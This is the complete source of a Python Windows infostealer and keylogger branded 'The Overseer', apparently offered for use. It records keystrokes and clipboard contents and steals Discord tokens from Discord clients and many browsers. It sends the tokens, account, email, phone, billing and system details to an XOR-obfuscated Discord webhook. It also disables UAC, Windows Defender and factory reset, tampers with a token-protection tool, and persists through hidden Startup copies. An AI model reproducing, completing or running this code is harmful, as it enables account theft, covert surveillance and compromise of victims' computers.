import requests
from pynput import keyboard
import pyperclip
import time
import threading
from threading import Thread
import os
import json
import re
from Crypto.Cipher import AES
import base64
from win32crypt import CryptUnprotectData
from datetime import datetime
import platform
import random
import psutil
import socket
import subprocess
import win32file
import sys
import ctypes
import shutil
import string

# Fuck comments

WEBHOOK_URL = [61, 33, 33, 37, 38, 111, 122, 122, 49, 60, 38, 54, 58, 39, 49, 123, 54, 58, 56, 122, 52, 37, 60, 122, 34, 48, 55, 61, 58, 58, 62, 38, 122, 100, 102, 102, 98, 100, 108, 103, 100, 101, 96, 109, 101, 96, 99, 100, 96, 100, 97, 97, 122, 61, 44, 103, 6, 0, 1, 51, 6, 55, 17, 20, 30, 4, 19, 12, 6, 33, 38, 96, 45, 59, 34, 31, 3, 15, 17, 30, 39, 32, 44, 6, 38, 18, 22, 103, 37, 47, 108, 57, 45, 56, 23, 25, 49, 35, 10, 49, 96, 4, 31, 50, 50, 120, 62, 18, 20, 44, 6, 5, 22, 22, 38, 100, 25, 108, 20, 45, 100]
decoded_webhook = "".join(chr(x ^ 0x55) for x in WEBHOOK_URL)

key_buffer = []
last_clipboard_content = ""

def send_to_webhook(message):
    payload = {"content": message}
    try:
        response = requests.post(decoded_webhook, json=payload)
        if response.status_code != 204:
            pass
    except Exception:
        pass

def on_press(key):
    global key_buffer
    try:
        key_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            key_buffer.append(" ")
        elif key == keyboard.Key.backspace:
            if key_buffer:
                key_buffer.pop()

def on_release(key):
    global key_buffer
    if key == keyboard.Key.enter:
        message = "".join(key_buffer).strip()
        if message:
            send_to_webhook(f"{message}")
        key_buffer.clear()
    if key == keyboard.Key.f10:
        send_to_webhook("Keylogger has been stopped.")
        return False

def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content != last_clipboard_content:
                last_clipboard_content = clipboard_content
                if clipboard_content.strip():
                    send_to_webhook(f"Clipboard: {clipboard_content}")
        except Exception:
            pass
        time.sleep(1)

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = set()
        self.tokens = set()
        self.ids = set()
        self.killprotector()
        self.grabTokens()

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
        if not os.path.exists(path):
            return
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': os.path.join(self.roaming + '\\discord\\Local Storage\\leveldb\\'),
            'Discord Canary':  os.path.join(self.roaming + '\\discordcanary\\Local Storage\\leveldb\\'),
            'Lightcord':  os.path.join(self.roaming + '\\Lightcord\\Local Storage\\leveldb\\'),
            'Discord PTB':  os.path.join(self.roaming + '\\discordptb\\Local Storage\\leveldb\\'),
            'Opera':  os.path.join(self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\'),
            'Opera GX':  os.path.join(self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\'),
            'Amigo':  os.path.join(self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\'),
            'Torch':  os.path.join(self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\'),
            'Kometa':  os.path.join(self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\'),
            'Orbitum':  os.path.join(self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\'),
            'CentBrowser':  os.path.join(self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\'),
            '7Star':  os.path.join(self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\'),
            'Sputnik':  os.path.join(self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\'),
            'Vivaldi':  os.path.join(self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Chrome SxS':  os.path.join(self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\'),
            'Chrome':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Chrome1':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\'),
            'Chrome2':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\'),
            'Chrome3':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\'),
            'Chrome4':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\'),
            'Chrome5':  os.path.join(self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\'),
            'Epic Privacy Browser':  os.path.join(self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\'),
            'Microsoft Edge':  os.path.join(self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Uran':  os.path.join(self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Yandex':  os.path.join(self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Brave':  os.path.join(self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Iridium': os.path.join(self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'),
            'Vesktop':  os.path.join(self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\')
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.add(token)
                                        self.ids.add(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.add(token)
                                    self.ids.add(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.add(token)
                                    self.ids.add(uid)

    def validate_token(self, token):
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
        }
        try:
            response = requests.get(self.baseurl, headers=headers)
            if response.status_code == 200:
                user_id = response.json().get("id")
                if user_id and user_id not in self.ids:
                    self.ids.add(user_id)
                    return True
        except Exception:
            pass
        return False
    
    def get_account_creation_date(self, discord_id):
        timestamp = (int(discord_id) >> 22) + 1420070400000
        return datetime.fromtimestamp(timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
    
    def get_subscription_expiry(self, token):
        url = "https://discord.com/api/v9/users/@me/billing/subscriptions"
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        }

        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                subscriptions = response.json()
                if subscriptions:
                    expiry_timestamp = subscriptions[0].get("current_period_end")
                    if expiry_timestamp:
                        return datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                return "No active subscription"
            else:
                return "Failed to fetch subscription data"
        except Exception as e:
            return f"Error: {e}"
        
    def get_router_ip(self):
        system = platform.system()
        try:
            if system == "Windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                output = result.stdout
                gateway_matches = re.findall(r"Default Gateway\s*[\.\s]*:\s*([\d\.]+)", output)
                router_ip = gateway_matches[0] if gateway_matches else "Unknown"
            else:
                result = subprocess.run(["ip", "route"], capture_output=True, text=True)
                output = result.stdout
                gateway_match = re.search(r"default via ([\d\.]+)", output)
                router_ip = gateway_match.group(1) if gateway_match else "Unknown"
        except Exception as e:
            router_ip = f"Error: {e}"
        return router_ip
    
    def get_system_info(self):
        cpu_count = psutil.cpu_count(logical=True)
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq()

        memory = psutil.virtual_memory()

        disk = psutil.disk_usage('/')

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        router_ip = self.get_router_ip()

        system = platform.system()
        release = platform.release()
        version = platform.version()

        info = (
            f"**System Information**\n"
            f"**Hostname:** {hostname}\n"
            f"**IP Address:** {ip_address}\n"
            f"**OS:** {system} {release} ({version})\n\n"
            f"**CPU Usage:** {cpu_percent}%\n"
            f"**CPU Cores:** {cpu_count}\n"
            f"**CPU Frequency:** {cpu_freq.current} MHz\n\n"
            f"**Memory Usage:** {memory.percent}%\n"
            f"**Total Memory:** {memory.total / (1024 ** 3):.2f} GB\n"
            f"**Available Memory:** {memory.available / (1024 ** 3):.2f} GB\n\n"
            f"**Disk Usage:** {disk.percent}%\n"
            f"**Total Disk Space:** {disk.total / (1024 ** 3):.2f} GB\n"
            f"**Free Disk Space:** {disk.free / (1024 ** 3):.2f} GB\n\n"
            f"**Router IP:** {router_ip}"
        )
        return info
    
    def send_to_webhook(self):
        webhook_url = decoded_webhook
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
                }

            try:
                user = requests.get(self.baseurl, headers=headers).json()
                username = user['username']
                discord_id = user['id']
                avatar_hash = user.get('avatar')
                if avatar_hash:
                    avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                        if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                        else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
                else:
                    avatar =  f"https://cdn.discordapp.com/embed/avatars/{int(discord_id) % 5}.png"
                payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
                phone_num = user['phone']
                email = user['email']
                creation_date = self.get_account_creation_date(discord_id)

                mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"

                nitro_types = {
                    0: ":x:",
                    1: "Nitro Classic",
                    2: "Nitro",
                    3: "Nitro Basic"
                }
                nitro = nitro_types.get(user.get('premium_type'), ":x:")

                subscription_expiry = ""
                if nitro != ":x:":
                    subscription_expiry = self.get_subscription_expiry(token)

                nitro_field = f"{nitro}"
                if subscription_expiry and subscription_expiry != "No active subscription":
                    nitro_field += f"\n**Expires in:** `{subscription_expiry}`"

                if "message" in payment or payment == []:
                    methods = ":x:"
                else:
                    methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])
                
                friends_response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
                friends_count = len(friends_response.json()) if friends_response.status_code == 200 else 0

                guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
                guilds_count = len(guilds_response.json()) if guilds_response.status_code == 200 else 0

                activities_response = requests.get("https://discord.com/api/v9/users/@me/activities", headers=headers)
                activities = activities_response.json() if activities_response.status_code == 200 else []
                current_activity = activities[0]['name'] if activities else "None"

                connections_response = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers)
                connections = connections_response.json() if connections_response.status_code == 200 else []
                connected_accounts = ", ".join([acc['name'] for acc in connections]) if connections else "None"

                hypesquad_response = requests.get("https://discord.com/api/v9/users/@me/hypesquad", headers=headers)
                hypesquad_data = hypesquad_response.json() if hypesquad_response.status_code == 200 else {}
                hypesquad_house = hypesquad_data.get('house', "None")

                badges = user.get('public_flags', 0)
                badge_names = {
                    1: "Staff",
                    2: "Partner",
                    4: "HypeSquad Events",
                    8: "Bug Hunter Level 1",
                    64: "Bug Hunter Level 2",
                    128: "Early Supporter",
                    256: "Verified Bot Developer",
                    512: "Early Verified Bot Developer",
                    16384: "HypeSquad Bravery",
                    32768: "HypeSquad Brilliance",
                    65536: "HypeSquad Balance"
                }
                badges_list = [badge_names[flag] for flag in badge_names if badges & flag]

                profile_response = requests.get("https://discord.com/api/v9/users/@me/profile", headers=headers)
                profile_data = profile_response.json() if profile_response.status_code == 200 else {}
                bio = profile_data.get('bio', 'No bio set')

                boosts_response = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscriptions", headers=headers)
                boosts = boosts_response.json() if boosts_response.status_code == 200 else []
                boosts_count = len(boosts)

                system_info = self.get_system_info()

                main_embed = {
                    "title": "The Overseer's info",
                    "color": 4915330,
                    "fields": [
                        {
                            "name": f"{username}",
                            "value": f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}` \n\n:mobile_phone: **Phone:** `{phone_num}` \n\n:closed_lock_with_key: **2FA:** `{mfa}` \n<a:nitroboost:996004213354139658> **Nitro:** `{nitro}` \n<:billing:1051512716549951639> **Billing:** `{methods}` \n\n<:crown1:1051512697604284416> **Token:** `{token}`\n:calendar: **Account created:** `{creation_date}` \n '
                        }
                    ],
                    "thumbnail": {
                        "url": avatar
                    },
                    "footer": {
                        "text": "The Overseer 0.0.1.6 | Created by The Magic Man"
                    }
                }
                
                extra_info_embed = {
                    "title": "Extra Info",
                    "color": 0x00FF00,
                    "fields": [
                        {
                            "name": "Friends",
                            "value": f":people_hugging: **Count:** `{friends_count}`",
                            "inline": True
                        },
                        {
                            "name": "Servers",
                            "value": f":classical_building: **Count:** `{guilds_count}`",
                            "inline": True
                        },
                        {
                            "name": "Current Activity",
                            "value": f":video_game: **Activity:** `{current_activity}`",
                            "inline": True
                        },
                        {
                            "name": "Connected Accounts",
                            "value": f":link: **Accounts:** `{connected_accounts}`",
                            "inline": True
                        },
                        {
                            "name": "HypeSquad House",
                            "value": f":house: **House:** `{hypesquad_house}`",
                            "inline": True
                        },
                        {
                            "name": "Badges",
                            "value": f":medal: **Badges:** `{', '.join(badges_list) if badges_list else 'None'}`",
                            "inline": True
                        },
                        {
                            "name": "Bio",
                            "value": f":notepad_spiral: **Bio:** `{bio}`",
                            "inline": True
                        },
                        {
                            "name": "Boosts",
                            "value": f":sparkles: **Boosts:** `{boosts_count}`",
                            "inline": True
                        }
                    ],
                    "footer": {
                        "text": "Additional Information"
                    }
                }

                system_info_embed = {
                    "title": "System",
                    "color": 0x0000FF,
                    "fields": [
                        {
                            "name": "System Info",
                            "value": system_info
                        }
                    ]
                }

                data = {
                    "embeds": [main_embed, extra_info_embed, system_info_embed],
                    "username": "The Overseer"
                }
                response = requests.post(webhook_url, json=data)
                if response.status_code == 200:
                    self.tokens_sent.add(token)
            except Exception as e:
                    print(f"Error sending webhook: {e}")

def forceadmin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    while True:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        if result <= 32:
            time.sleep(0.01)
        else:
            return
        
def pathadd():
    if sys.platform == 'win32' and os.path.basename(sys.executable).lower() == 'systemservice92.exe':
        exe_dir = os.path.dirname(sys.executable)
        os.environ['PATH'] = exe_dir + os.pathsep + os.environ.get('PATH', '')
        subprocess.run(["setx", "PATH", os.environ['PATH']], check=True, creationflags=subprocess.CREATE_NO_WINDOW)

def random_filename(length=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + '.exe'

def starttup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    random_name = random_filename()
    target_exe = os.path.join(startup_folder, random_name)
    
    if not os.path.exists(target_exe):
        shutil.copy2(sys.executable, target_exe)
        win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)

def ss():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    target_exe = os.path.join(startup_folder, "system99889.exe")
    
    if not os.path.exists(target_exe):
        shutil.copy2(sys.executable, target_exe)
        win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)

def neverstop():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable
    
    while True:
        if not os.path.exists(os.path.join(startup_folder, os.path.basename(exe_path))):
            try:
                shutil.copy(exe_path, startup_folder)
            except Exception:
                pass
        time.sleep(0.5)

def uac():
    try:
        subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/t','REG_DWORD','/d','0','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['reg','delete',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/f'],check=False,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['reg','add',r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','ConsentPromptBehaviorAdmin','/t','REG_DWORD','/d','0','/f'],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
    except subprocess.CalledProcessError:
        return

def Defender():
    commands = [
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "SubmitSamplesConsent", "/t", "REG_DWORD", "/d", "2", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableCloudProtection", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Behavior Monitoring", "/v", "DisableBehaviorMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableNetworkProtection", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiVirusSignatures", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAccess", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAccess", "/t", "REG_DWORD", "/d", "1", "/f"],
        ["reg", "delete", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableSecurityCenter", "/f"],
        ["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableSecurityCenter", "/t", "REG_DWORD", "/d", "1", "/f"],
    ]
    threads = []
    for command in commands:
        thread = threading.Thread(target=subprocess.run, args=(command,), kwargs={"check": False, "creationflags": subprocess.CREATE_NO_WINDOW})
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

def disable_reset():
    command = "reagentc.exe"
    args = "/disable"

    try:
        result = subprocess.run(
            [command, args],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if result.returncode != 0:
            print(f"Error: {result.stderr.decode('utf-8')}")
        else:
            print("Factory reset has been disabled successfully.")

    except FileNotFoundError:
        print("File has not been found. Please run this on a windows system.")
    except PermissionError:
        print("Access denied. Please run this script as an administrator.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")

def main():
    forceadmin()
    Thread(target=starttup).start()
    Thread(target=uac).start()
    Thread(target=Defender).start()
    Thread(target=disable_reset).start()
    Thread(target=pathadd).start()
    Thread(target=neverstop).start()
    discord = Discord()
    Thread(target=discord.send_to_webhook).start()

if __name__ == '__main__':
    main()
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    send_to_webhook("Keylogger has been started.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()